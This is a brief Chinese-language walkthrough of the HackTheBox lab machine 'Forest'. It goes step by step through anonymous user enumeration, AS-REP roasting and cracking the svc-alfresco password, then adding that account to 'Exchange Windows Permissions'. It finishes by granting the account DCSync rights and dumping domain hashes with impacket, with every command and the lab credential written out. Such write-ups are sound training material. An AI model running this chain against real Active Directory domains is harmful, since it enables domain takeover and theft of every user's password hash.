---
title: Forest
weight: 212
tags:
  - windows
  - easy
  - asreproast
  - dcsync
---


## 1. 信息收集


[[389,636,3268,3269 - LDAP]]，发现可以匿名访问

```bash
nxc smb 10.10.10.161 -u '' -p '' --users 
```

[[ASREPRoast]] 攻击，拿到`svc-alfresco`账户的TGT，爆破得到密码

使用该账户 [[RustHound]] 收集数据

根据结果：

将指定用户添加到指定组

```bash
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "forest.htb.local"
```


验证是否加入成功

```bash
net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "forest.htb.local"
```

给自己写入DCSync ACL

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -dc-ip 10.10.10.161 'htb.local'/'svc-alfresco':'s3rvice'
```

[[DCSync]]

```bash
impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@'forest.htb.local' 
```